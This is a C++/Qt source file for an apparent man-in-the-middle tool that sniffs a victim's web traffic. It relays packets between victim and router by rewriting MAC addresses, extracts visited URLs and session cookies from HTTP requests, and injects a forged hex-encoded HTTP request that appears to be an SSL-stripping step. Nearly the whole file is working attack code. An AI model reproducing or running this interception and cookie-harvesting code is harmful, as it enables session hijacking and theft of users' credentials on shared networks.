#include "relay_spoof.h"
#include <QCoreApplication>

void getUrl(u_char *packet, int len);
void sendUrl(u_char *packet, int len);
void getStrip(pcap_t *spoofPcap, u_char *packet);

QStringList relay_url_list, relay_data_list;
unsigned get_broad_cnt = 0, test_cnt = 0, ssl_cnt = 0;

u_char spoofAtkMac[6] = {0,}, spoofRouterMac[6] = {0,}, spoofVictimMac[6] = {0,};
pcap_if_t *spoofDevs;

relay_spoof::relay_spoof(QObject *parent) : QThread(parent) {

}

void relay_spoof::run() {
	int cnt = 0;
	bpf_u_int32 netp, maskp;
	struct bpf_program filter;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct pcap_pkthdr *pkthdr;
	u_char *packet;
	struct libnet_ethernet_hdr *eth;
	struct libnet_tcp_hdr *tcp;
	pcap_t *spoofPcap;

	if(pcap_lookupnet(spoofDevs->name, &netp, &maskp, errbuf) == -1) exit(1);
	spoofPcap = pcap_open_live(spoofDevs->name, 65535, 0, -1, errbuf);
	if(pcap_compile(spoofPcap, &filter, "tcp port 80 or tcp port 443 or tcp port 8080", 0, maskp) == -1) exit(1);
	if(pcap_setfilter(spoofPcap, &filter) == -1) exit(1);

	pre_filter(relayAtkMac.toLatin1().data(), spoofAtkMac, ETHER_ADDR_LEN, "upper");
	pre_filter(relayRouterMac.toLatin1().data(), spoofRouterMac, ETHER_ADDR_LEN, "upper");
	pre_filter(relayVictimMac.toLatin1().data(), spoofVictimMac, ETHER_ADDR_LEN, "upper");

	spoofStop = false;

	while(1) {
		while((cnt = pcap_next_ex(spoofPcap, &pkthdr, (const u_char**)&packet)) > 0) {
			eth = (struct libnet_ethernet_hdr *)packet;
			tcp = (struct libnet_tcp_hdr *)(packet + sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_ipv4_hdr));

			if(flag_check(eth->ether_dhost, spoofAtkMac, ETHER_ADDR_LEN) != 1 && flag_check(eth->ether_shost, spoofRouterMac, ETHER_ADDR_LEN) == 1 && flag_check(eth->ether_shost, spoofVictimMac, ETHER_ADDR_LEN) != 1 && ntohs(eth->ether_type) == ETHERTYPE_IP) {
#if RELAY_SPOOF
				for(i = 0; i < ETHER_ADDR_LEN; i++) {
					// Ethernet frame //
					// Dst: Router Mac addr 6 bytes
					// Src: Attacker Mac addr 6 bytes
					*(packet + i) = *(spoofRouterMac + i);
					*(packet + ETHER_ADDR_LEN + i) = *(spoofAtkMac + i);
				}

				pcap_sendpacket(spoofPcap, packet, pkthdr->len);
	#if DEBUG_ON
				printf("\n##### Host to WEB in (%s:%s:%d) #####\n", __FILE__, __func__, __LINE__);
				print_packet(pkthdr->len, packet);
	#endif
#endif

				if(ntohs(tcp->th_dport) == 443) {
#if DEBUG_ON
					printf("\n##### SSL Packet in (%s:%s:%d) #####\n", __FILE__, __func__, __LINE__);
					print_packet(pkthdr->len, packet);
					print_headers(packet);
#endif
					if(ssl_cnt < 3) getStrip(spoofPcap, packet);
				}

				getUrl(packet, pkthdr->len);
				if(get_broad_cnt != test_cnt) {
					emit relay_urlList(relay_url_list);
					test_cnt++;
				}
			}

			if(flag_check(eth->ether_dhost, spoofAtkMac, ETHER_ADDR_LEN) != 1 && flag_check(eth->ether_shost, spoofRouterMac, ETHER_ADDR_LEN) != 1 && flag_check(eth->ether_shost, spoofVictimMac, ETHER_ADDR_LEN) == 1 && ntohs(eth->ether_type) == ETHERTYPE_IP) {
#if RELAY_SPOOF
				for(i = 0; i < ETHER_ADDR_LEN; i++) {
					// Ethernet frame //
					// Dst: Victim Mac addr 6 bytes
					// Src: Attacker Mac addr 6 bytes
					*(packet + i) = *(spoofVictimMac + i);
					*(packet + ETHER_ADDR_LEN + i) = *(spoofAtkMac + i);
				}

				pcap_sendpacket(spoofPcap, packet, pkthdr->len);
	#if DEBUG_ON
				printf("\n##### WEB to Host in (%s:%s:%d) #####\n", __FILE__, __func__, __LINE__);
				print_packet(pkthdr->len, packet);
	#endif
#endif
				sendUrl(packet, pkthdr->len);
			}
		}

		if(spoofStop) break;
	}

	emit relay_dataList(relay_data_list);
	emit relay_spoofFin(true);
}

void getUrl(u_char *packet, int len) {
	int i = 0, tmp = 0, cnt = 0, get_len = len;
	bool var = false;
	u_char *text = packet;
	QString imsi, tempStr;
	text += 54;
	get_len -= 54;

	while(get_len > 0) {
        if(!strncmp((const char*)text, "GET", 3))
			while(get_len > 0) {
				if(*(text+i) > 32 && *(text+i) < 127) {
					tempStr.append(*(text+i));
					tmp = 0;
					var = true;
				}
				if(*(text+i) < 32 && var == true) tempStr.append('.');
				else if(*(text+i) == 32 && var == true) tempStr.append(' ');
				i++;
				get_len--;
			}
		i++;
		get_len--;
		if(var == true) break;
	}

	i = 0; tmp = 0;
	if(!tempStr.isEmpty()) {
		//        qDebug() << "#####getUrl : " << tempStr;
		while(true) {
            if(!strncasecmp(tempStr.toLocal8Bit().data() + i, "Host:", 5)) {
				i += 6;
				imsi.append("http://");

				while(true) {
                    if(!strncmp(tempStr.toLocal8Bit().data() + i, "..", 2) || tempStr.length() == i) break;
					imsi.append(tempStr.at(i++));
				}

				i -= (tmp + imsi.length() - 1);
				while(true) {
                    if(!strncasecmp(tempStr.toLocal8Bit().data() + i, "GET", 3) && tempStr.at(i+5) != ' ') {
						i += 4;
						while(true) {
							imsi.append(tempStr.at(i++));
                            if(!strncmp(tempStr.toLocal8Bit().data() + i, "/ ", 2)) break;
                            else if(!strncasecmp(tempStr.toLocal8Bit().data() + i + 1, "HTTP/", 5) || tempStr.length() == i) break;
						}
					}
					else if(tempStr.length() == (++i)) break;
				}

				if(!relay_url_list.isEmpty()) for(tmp = 0; tmp < relay_url_list.length(); tmp++) if(relay_url_list.at(tmp) == imsi) cnt = 100;

				if(cnt != 100) {
					get_broad_cnt++;
					imsi.detach();
					relay_url_list.append(imsi);
				}
			}
			if(tempStr.length() <= (++i)) break;
			else tmp = i;
		}

		i = 0; imsi.clear();
		if(tempStr.contains("Cookie: ")) {
			while(true) {
                if(!strncasecmp(tempStr.toLocal8Bit().data() + i, "Cookie: ", 8)) {
					while(true) {
						imsi.append(tempStr.at(i++));
                        if(!strncmp(tempStr.toLocal8Bit().data() + i, "....", 4)) break;
					}
					relay_data_list.append(imsi);
					break;
				}
				else if(tempStr.length() == (++i)) break;
			}
		}
		else relay_data_list.append("Not exist cookie");

		qDebug() << "#####Cookie : " << relay_data_list.at(get_broad_cnt - 1);
	}
}

void sendUrl(u_char *packet, int len) {
	QString tempStr;
	u_char *text = packet;

	for(int i = 0; i < (len - 1); i++) tempStr.append(*(text+i));
	//    qDebug() << "sendUrl : " << tempStr;
}

void getStrip(pcap_t *spoofPcap, u_char *packet) {
	char str[INET_ADDRSTRLEN] = {0,};
	struct libnet_ipv4_hdr *ip;
	unsigned startHttp = sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_ipv4_hdr) + sizeof(struct libnet_tcp_hdr);

	const char * host1 = "\x47\x45\x54\x20\x2f\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x20\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x37\x2e\x30\x3b\x20\x72\x76\x3a\x31\x31\x2e\x30\x29\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x0d\x0a\x41\x63\x63\x65\x70\x74\x3a\x20\x2a\x2f\x2a\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x45\x6e\x63\x6f\x64\x69\x6e\x67\x3a\x20\x69\x64\x65\x6e\x74\x69\x74\x79\x0d\x0a\x48\x6f\x73\x74\x3a\x20";
	const char * host2 = "\x0d\x0a\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a\x20\x4b\x65\x65\x70\x2d\x41\x6c\x69\x76\x65\x0d\x0a\x0d\x0a";
	u_char *fakePacket = (u_char*)malloc(sizeof(u_char) * (sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_ipv4_hdr) + sizeof(struct libnet_tcp_hdr) + strlen(host1) + strlen(host2) + IP_ADDR_LEN));

	for(int i = 0; i < startHttp; i++)
		*(fakePacket + i) = *(packet + i);
#if 0
"GET / HTTP/1.1 \
User-Agent : Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko \
Accept: */* \
Accept-Encoding: identity \
Host: %s \
Connection: Keep-Alive \
";
#endif
	ip = (struct libnet_ipv4_hdr *)(fakePacket + sizeof(struct libnet_ethernet_hdr));
	unsigned ipLocate = sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_ipv4_hdr);
	unsigned pktLen = startHttp + strlen(host1) + IP_ADDR_LEN + strlen(host2);
	*(fakePacket + ipLocate + sizeof(uint16_t)) = 0x00;
	*(fakePacket + ipLocate + sizeof(uint16_t) + sizeof(char)) = 0x50;

	for(int i = 0; i < strlen(host1); i++)
		*(fakePacket + i + startHttp) = *(host1 + i);
	
	for(int i = 0; i < IP_ADDR_LEN; i++)
		*(fakePacket + i + startHttp + strlen(host1)) = *(packet + ipLocate - IP_ADDR_LEN + i);
	
	for(int i = 0; i < strlen(host2); i++)
		*(fakePacket + i + startHttp + strlen(host1) + IP_ADDR_LEN) = *(host2 + i);

	pcap_sendpacket(spoofPcap, fakePacket, pktLen);
#if DEBUG_ON
	print_packet(pktLen, fakePacket);
	print_headers(fakePacket);
#endif
	ssl_cnt++;
}

void relay_spoof::relayGetMacInfo(QString victim, QString atk, QString router, pcap_if_t *devs) {
	relayVictimMac = victim;
	relayAtkMac = atk;
	relayRouterMac = router;
	spoofDevs = devs;
}
